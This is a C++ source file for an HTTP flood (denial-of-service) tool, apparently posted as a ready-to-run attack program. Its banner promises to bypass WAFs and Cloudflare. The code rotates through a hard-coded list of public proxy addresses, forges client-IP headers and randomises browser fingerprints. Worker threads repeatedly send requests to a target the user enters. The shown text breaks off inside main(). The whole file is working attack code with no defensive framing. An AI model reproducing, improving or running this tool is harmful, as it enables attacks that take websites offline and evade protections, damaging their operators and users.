#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <random>
#include <cstring>
#include <sstream>
#include <iomanip>
#include <atomic>
#include <mutex>

#ifdef _WIN32
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")
#else
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <fcntl.h>
#endif

#include <openssl/ssl.h>
#include <openssl/err.h>

const char* asciiArt = R"(⠀⠀⢀⣶⡶⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢾⡲⣟⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠘⠻⣦⡃⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠙⣷⣕⢄⡀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠹⣷⣌⠹⢷⣟⡦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠛⢷⣏⠻⣯⣏⢦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣄⡿⣿⣼⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣷⣿⣿⣦⡕⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣟⣿⣾⣽⢦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣷⣝⢿⣶⡿⣧⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣟⣼⠯⣭⢷⣽⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣿⡿⣿⣯⣻⣿⣿⢯⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⢿⣿⣿⣟⣦⡐⢮⠢⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⢟⣷⣝⡶⣕⢩⢃⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣷⣝⣿⡟⣿⣷⣍⠶⡐⢄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⣠⣤⣴⣾⣿⣿⣿⣿⣾⡷⣎⣳⣿⣷⣬⠳⣑⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⣿⣷⣮⣽⡙⢷⣵⣮⡣⣔⡠⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠛⠉⠀⠠⢻⠋⠀⠙⣿⢦⡙⢿⣷⢦⡙⢫⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠙⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⢋⡟⡿⡤⠙⢷⣿⢦⡅⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣽⣿⣷⣟⢿⣤⢝⣷⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⡿⠛⠘⢽⣼⣿⣯⣂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⣟⡾⠁⠀⠀⠈⢿⣿⣿⣿⢧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣽⢹⠁⠀⠀⠀⠀⠈⣿⣿⡟⡖⡌⠉⢢⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠋⠀⠀⠀⠀⠀⠀⠹⣿⣝⣋⢆⠀⠀⠣⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⣿⣼⡢⡄⢒⠀⠉⢆⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡼⣷⡆⡀⢀⠥⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢻⣿⣿⡞⣿⡬⣁⡂⡙⢤⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣮⢿⣵⢮⣷⠿⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡾⠋⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⠟⠁⠀⠀⠀⠀⠀
Layer 7 + bypass waf and bypass cloudflare + proxy rotation)";

std::vector<std::string> uas = {
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36 OPR/105.0.0.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:119.0) Gecko/20100101 Firefox/119.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:118.0) Gecko/20100101 Firefox/118.0",
};

std::vector<std::string> langs = {"en-US,en;q=0.9", "en-GB,en;q=0.8", "id-ID,id;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9", "de-DE,de;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "ru-RU,ru;q=0.9", "zh-CN,zh;q=0.9", "ko-KR,ko;q=0.9"};
std::vector<std::string> encs = {"gzip, deflate, br", "gzip, deflate", "br", "identity", "*"};
std::vector<std::string> conns = {"keep-alive", "close"};
std::vector<std::string> ccs = {"max-age=0", "no-cache", "no-store", "must-revalidate", "private", "public"};
std::vector<std::string> prags = {"no-cache", "cache", ""};
std::vector<std::string> sfds = {"document", "image", "script", "style", "empty"};
std::vector<std::string> sfms = {"navigate", "no-cors", "cors", "same-origin"};
std::vector<std::string> sfss = {"none", "same-origin", "same-site", "cross-site"};
std::vector<std::string> uis = {"1", "0"};
std::vector<std::string> dnts = {"1", "0", ""};
std::vector<std::string> tes = {"trailers", ""};
std::vector<std::string> xrws = {"XMLHttpRequest", "Fetch", ""};
std::vector<std::string> plats = {"Windows", "macOS", "Linux", "Android", "iOS"};
std::vector<std::string> archs = {"x86", "arm", "x86_64"};
std::vector<std::string> ects = {"4g", "3g", "2g"};

std::vector<std::string> proxies = {
    "38.41.12.88:999", "89.208.107.167:1080", "206.189.88.243:8080",
    "38.156.75.227:8080", "94.154.127.96:8085", "184.178.172.13:15311",
    "8.213.222.157:9080", "197.221.240.240:80", "185.54.178.193:1080",
    "49.48.47.72:8080", "66.29.128.241:12795", "8.211.194.85:3128",
    "198.105.100.215:6466", "45.67.215.7:80", "23.236.188.20:3128",
    "172.67.129.0:80", "47.251.73.54:8443", "75.119.141.230:27666",
    "217.144.185.242:22578", "199.233.238.6:4238", "205.185.116.159:5556",
    "198.105.122.94:6667", "78.9.232.205:8080", "209.50.172.135:3129",
    "72.210.221.197:4145", "190.119.160.26:59842", "103.229.252.67:1080",
    "80.78.70.253:65530", "46.202.227.181:6175", "146.103.56.9:5557",
    "203.205.33.131:1452", "129.226.148.192:443", "45.67.215.167:80",
    "27.75.153.175:1080", "199.102.106.94:4145", "219.249.37.107:8382",
    "41.190.57.66:5678", "202.150.148.218:61924", "181.78.17.191:999",
    "175.229.79.45:999", "103.189.63.149:56457", "93.177.94.59:8085",
    "184.174.46.240:5869", "5.61.62.24:8118", "31.59.20.28:6606",
    "162.220.247.45:6640", "136.0.120.163:6181", "142.111.44.9:5721",
    "103.174.178.133:1020", "162.144.74.156:3620", "95.173.218.69:8082",
    "162.241.207.217:80", "166.88.83.133:6790", "145.223.46.55:5605",
    "8.213.134.213:20", "89.43.132.247:8080", "192.99.244.173:15590",
    "103.111.160.41:5678", "51.158.105.107:16379", "103.12.246.33:4145",
    "134.209.29.120:80", "178.212.144.7:80", "213.25.70.1:3629",
    "8.211.194.78:1081", "202.62.37.45:1080", "207.180.204.122:5412",
    "80.190.83.69:8080", "103.174.178.137:1020", "8.213.134.213:9091",
    "103.156.96.71:8088", "47.238.130.212:4145", "181.214.39.51:5719",
    "209.14.115.101:999", "198.105.100.190:6441", "88.20.124.158:4145",
    "198.49.68.80:80", "58.27.203.108:5678", "47.108.159.113:9080",
    "45.43.64.40:6298", "45.73.0.118:5678", "213.76.184.53:3128",
    "38.154.49.238:8800", "47.238.128.246:6379", "101.255.208.18:8090",
    "91.150.189.122:30389", "45.43.64.50:6308", "150.136.163.51:80",
    "50.203.147.154:80", "202.159.35.153:443", "205.185.120.241:5556",
    "8.220.205.172:12000", "68.178.171.140:26070", "8.211.194.78:3129",
    "31.59.20.192:6770", "207.230.8.70:999", "103.145.34.9:55443",
    "1.4.198.152:4145", "8.215.12.103:8002", "195.154.43.198:39522",
    "8.211.194.78:4002", "8.213.222.247:4002", "68.71.249.153:48606",
    "72.206.181.97:64943", "103.82.246.23:6080", "31.40.144.129:8888",
    "104.25.166.205:80", "45.115.115.37:9090", "62.60.235.5:80",
    "8.213.222.247:3128", "103.53.110.45:10801", "171.247.247.47:1080",
    "103.124.251.12:8081", "72.221.196.157:35904", "8.211.49.86:8081",
    "31.131.135.247:4153", "156.146.56.231:8081", "91.200.163.190:8088",
    "65.111.6.195:9090", "8.213.128.6:87", "8.211.51.115:84",
    "175.99.220.171:80", "159.112.235.87:80", "112.86.116.24:1080",
    "58.99.118.153:80", "138.255.240.66:40736", "162.220.246.161:6445",
    "129.153.107.221:80", "199.116.114.11:4145", "103.164.229.149:8080",
    "79.106.108.132:8079", "47.238.60.156:3128", "45.233.90.10:443",
    "172.66.40.80:80", "166.88.238.10:5990", "205.185.114.78:5556",
    "81.143.236.200:443", "103.37.82.134:39873", "97.213.76.123:80"
};

std::atomic<int64_t> sent(0);
std::atomic<bool> running(true);
int threads = 0;
double delay = 1.0;
std::string target;
std::string host;
std::string path;
int port = 80;
bool isHttps = false;
std::mutex printMutex;

std::string rs(int length) {
    const char chars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    std::string result;
    for (int i = 0; i < length; i++) {
        result += chars[rand() % 62];
    }
    return result;
}

std::string rip() {
    return std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1) + "." +
           std::to_string(rand() % 254 + 1);
}

std::string buildPacket(const std::string& host, const std::string& path) {
    std::string ua = uas[rand() % uas.size()];
    std::string lang = langs[rand() % langs.size()];
    std::string enc = encs[rand() % encs.size()];
    std::string conn = conns[rand() % conns.size()];
    std::string cc = ccs[rand() % ccs.size()];
    std::string pr = prags[rand() % prags.size()];
    std::string sfd = sfds[rand() % sfds.size()];
    std::string sfm = sfms[rand() % sfms.size()];
    std::string sfs = sfss[rand() % sfss.size()];
    std::string ui = uis[rand() % uis.size()];
    std::string dnt = dnts[rand() % dnts.size()];
    std::string te = tes[rand() % tes.size()];
    std::string xrw = xrws[rand() % xrws.size()];
    std::string xff = rip();
    std::string cf = rip();
    std::string xri = rip();
    std::string tci = rip();
    std::string xci = rip();
    std::string xfp = rip();
    std::string rip2 = rip();
    std::string cip = rip();
    std::string q = rs(8) + "=" + rs(16);
    std::string ck = rs(12) + "=" + rs(24);
    std::string auth = "Bearer " + rs(32);
    std::string xid = rs(16);
    std::string xreq = rs(16);
    std::string xtr = rs(32);
    std::string xsp = rs(16);
    std::string plat = plats[rand() % plats.size()];
    std::string arch = archs[rand() % archs.size()];
    std::string ect = ects[rand() % ects.size()];
    int mem = (std::vector<int>{2, 4, 8, 16})[rand() % 4];
    double down = (rand() % 9500) / 1000.0 + 0.5;
    int rtt = rand() % 181 + 20;
    int vw = rand() % 1121 + 800;
    std::string save = (std::vector<std::string>{"on", "off"})[rand() % 2];
    int cv = rand() % 11 + 110;

    std::ostringstream oss;
    oss << "GET " << path << "?" << q << " HTTP/1.1\r\n";
    oss << "Host: " << host << "\r\n";
    oss << "User-Agent: " << ua << "\r\n";
    oss << "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n";
    oss << "Accept-Language: " << lang << "\r\n";
    oss << "Accept-Encoding: " << enc << "\r\n";
    oss << "Connection: " << conn << "\r\n";
    oss << "Upgrade-Insecure-Requests: " << ui << "\r\n";
    oss << "Sec-Fetch-Dest: " << sfd << "\r\n";
    oss << "Sec-Fetch-Mode: " << sfm << "\r\n";
    oss << "Sec-Fetch-Site: " << sfs << "\r\n";
    oss << "Sec-Fetch-User: ?1\r\n";
    oss << "Cache-Control: " << cc << "\r\n";
    oss << "Pragma: " << pr << "\r\n";
    oss << "X-Forwarded-For: " << xff << "\r\n";
    oss << "CF-Connecting-IP: " << cf << "\r\n";
    oss << "X-Real-IP: " << xri << "\r\n";
    oss << "True-Client-IP: " << tci << "\r\n";
    oss << "X-Client-IP: " << xci << "\r\n";
    oss << "X-Forwarded-Proto: https\r\n";
    oss << "X-Forwarded-Host: " << host << "\r\n";
    oss << "X-Forwarded-Port: 443\r\n";
    oss << "X-Forwarded-Server: " << host << "\r\n";
    oss << "X-Originating-IP: " << xfp << "\r\n";
    oss << "X-Remote-IP: " << rip2 << "\r\n";
    oss << "X-Remote-Addr: " << cip << "\r\n";
    oss << "X-Custom-Request-ID: " << xid << "\r\n";
    oss << "X-Request-ID: " << xreq << "\r\n";
    oss << "X-Trace-ID: " << xtr << "\r\n";
    oss << "X-Span-ID: " << xsp << "\r\n";
    oss << "Cookie: " << ck << "\r\n";
    oss << "Authorization: " << auth << "\r\n";
    oss << "Origin: https://" << host << "\r\n";
    oss << "Referer: https://www.google.com/search?q=" << rs(8) << "\r\n";
    oss << "DNT: " << dnt << "\r\n";
    oss << "TE: " << te << "\r\n";
    oss << "X-Requested-With: " << xrw << "\r\n";
    oss << "Priority: u=0, i\r\n";
    oss << "Viewport-Width: " << vw << "\r\n";
    oss << "Device-Memory: " << mem << "\r\n";
    oss << "Downlink: " << std::fixed << std::setprecision(1) << down << "\r\n";
    oss << "ECT: " << ect << "\r\n";
    oss << "RTT: " << rtt << "\r\n";
    oss << "Save-Data: " << save << "\r\n";
    oss << "Sec-CH-UA: \"Not_A Brand\";v=\"8\", \"Chromium\";v=\"" << cv << "\", \"Google Chrome\";v=\"" << cv << "\"\r\n";
    oss << "Sec-CH-UA-Mobile: ?" << rand() % 2 << "\r\n";
    oss << "Sec-CH-UA-Platform: \"" << plat << "\"\r\n";
    oss << "Sec-CH-UA-Platform-Version: \"" << std::fixed << std::setprecision(1) << (rand() % 50 / 10.0 + 10.0) << "\"\r\n";
    oss << "Sec-CH-UA-Full-Version-List: \"Not_A Brand\";v=\"8.0.0.0\", \"Chromium\";v=\"" << cv << ".0.0.0\"\r\n";
    oss << "Sec-CH-UA-Arch: \"" << arch << "\"\r\n";
    oss << "Sec-CH-UA-Bitness: \"" << (rand() % 2 == 0 ? 32 : 64) << "\"\r\n";
    oss << "Sec-CH-UA-Model: \"\"\r\n";
    oss << "Sec-CH-UA-WoW64: ?" << rand() % 2 << "\r\n";
    oss << "\r\n";
    return oss.str();
}

bool connectProxy(const std::string& proxy, int& proxyFd) {
    size_t colon = proxy.find(':');
    if (colon == std::string::npos) return false;
    std::string pHost = proxy.substr(0, colon);
    int pPort = std::stoi(proxy.substr(colon + 1));

#ifdef _WIN32
    proxyFd = socket(AF_INET, SOCK_STREAM, 0);
#else
    proxyFd = socket(AF_INET, SOCK_STREAM, 0);
#endif
    if (proxyFd < 0) return false;

    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(pPort);
    inet_pton(AF_INET, pHost.c_str(), &addr.sin_addr);

    struct timeval tv;
    tv.tv_sec = 3;
    tv.tv_usec = 0;
    setsockopt(proxyFd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));
    setsockopt(proxyFd, SOL_SOCKET, SO_SNDTIMEO, (const char*)&tv, sizeof(tv));

    if (connect(proxyFd, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(proxyFd);
        return false;
    }
    return true;
}

bool proxyConnectHTTP(int proxyFd, const std::string& targetHost, int targetPort) {
    std::string req = "CONNECT " + targetHost + ":" + std::to_string(targetPort) + " HTTP/1.1\r\nHost: " + targetHost + ":" + std::to_string(targetPort) + "\r\n\r\n";
    send(proxyFd, req.c_str(), req.length(), 0);
    char buf[1024];
    int n = recv(proxyFd, buf, sizeof(buf) - 1, 0);
    if (n > 0) {
        buf[n] = '\0';
        return strstr(buf, "200") != nullptr;
    }
    return false;
}

bool proxyConnectSOCKS5(int proxyFd, const std::string& targetHost, int targetPort) {
    unsigned char greeting[] = {0x05, 0x01, 0x00};
    send(proxyFd, (char*)greeting, 3, 0);
    char buf[256];
    int n = recv(proxyFd, buf, 2, 0);
    if (n < 2 || buf[0] != 0x05 || buf[1] != 0x00) return false;

    unsigned char req[256];
    req[0] = 0x05;
    req[1] = 0x01;
    req[2] = 0x00;
    req[3] = 0x01;
    struct sockaddr_in addr;
    inet_pton(AF_INET, targetHost.c_str(), &addr.sin_addr);
    memcpy(req + 4, &addr.sin_addr, 4);
    req[8] = (targetPort >> 8) & 0xFF;
    req[9] = targetPort & 0xFF;
    send(proxyFd, (char*)req, 10, 0);
    n = recv(proxyFd, buf, 10, 0);
    return n >= 10 && buf[1] == 0x00;
}

void hammer() {
    while (running) {
        std::string proxy = proxies[rand() % proxies.size()];
        int proxyFd = -1;
        if (!connectProxy(proxy, proxyFd)) continue;

        bool connected = proxyConnectHTTP(proxyFd, host, port);
        if (!connected) {
            close(proxyFd);
            continue;
        }

        SSL_CTX* ctx = nullptr;
        SSL* ssl = nullptr;
        if (isHttps) {
            ctx = SSL_CTX_new(TLS_client_method());
            SSL_CTX_set_default_verify_paths(ctx);
            SSL_CTX_set_verify(ctx, SSL_VERIFY_NONE, nullptr);
            ssl = SSL_new(ctx);
            SSL_set_fd(ssl, proxyFd);
            SSL_set_tlsext_host_name(ssl, host.c_str());
            if (SSL_connect(ssl) <= 0) {
                SSL_free(ssl);
                SSL_CTX_free(ctx);
                close(proxyFd);
                continue;
            }
        }

        std::string pkt = buildPacket(host, path);
        if (isHttps) {
            SSL_write(ssl, pkt.c_str(), pkt.length());
        } else {
            send(proxyFd, pkt.c_str(), pkt.length(), 0);
        }

        sent++;

        if (isHttps) {
            SSL_shutdown(ssl);
            SSL_free(ssl);
            SSL_CTX_free(ctx);
        }
        close(proxyFd);

        std::this_thread::sleep_for(std::chrono::duration<double>(delay));
    }
}

void printStatus() {
    while (running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
        std::lock_guard<std::mutex> lock(printMutex);
        std::system("clear || cls");
        std::cout << asciiArt << "\n";
        auto now = std::chrono::system_clock::now();
        auto time = std::chrono::system_clock::to_time(now);
        std::cout << "\n  " << std::put_time(std::localtime(&time), "%a %b %d %H:%M:%S %Y") << "\n";
        std::cout << "  <--packet sent! hammering-->\n";
        std::cout << "\n  bot is hammering...\n";
        std::cout << "  bot is hammering...\n";
        std::cout << "  bot is hammering...\n";
        std::cout << "\n  TARGET : " << target << "\n";
        std::cout << "  SENT   : " << sent.load() << "\n";
        std::cout << "  THREAD : " << threads << "\n";
        std::cout << "  DELAY  : " << delay << "s\n";
        std::cout << "  PROXY  : " << proxies.size() << " rotating\n";
        std::cout << "\n  Owner Rvpa\n";
    }
}

int main() {
    srand(time(nullptr));
    SSL_library_init();
    SSL_load_error_strings();
    OpenSSL_add_all_algorithms();

    std::system("clear || cls");
    std::cout << asciiArt << "\n\n";

    std::cout << "  Thread : ";
    std::cin >> threads;
    std::cout << "  Target : ";
    std::cin >> target;
    std::cout << "  Delay  : ";
    std::string delayStr;
    std::cin >> delayStr;
    delay = delayStr.empty() ? 1.0 : std::stod(delayStr);

    if (target.find("http://") == 0) {
        target = target.substr(7);
        isHttps = false;
        port = 80;
    } else if (target.find("https://") == 0) {
        target = target.substr(8);
        isHttps = true;
        port = 443;
    } else {
        isHttps = false;
        port = 80;
    }

    size_t slash = target.find('/');
    if (slash != std::string::npos) {
        host = target.substr(0, slash);
        path = target.substr(slash);
    } else {
        host = target;
        path = "/";
    }

    size_t colon = host.find(':');
    if (colon != std::string::npos) {
        port = std::stoi(host.substr(colon + 1));
        host = host.substr(0, colon);
    }

    std::cout << "\n  [+] Thread : " << threads << "\n";
    std::cout << "  [+] Target : " << host << 
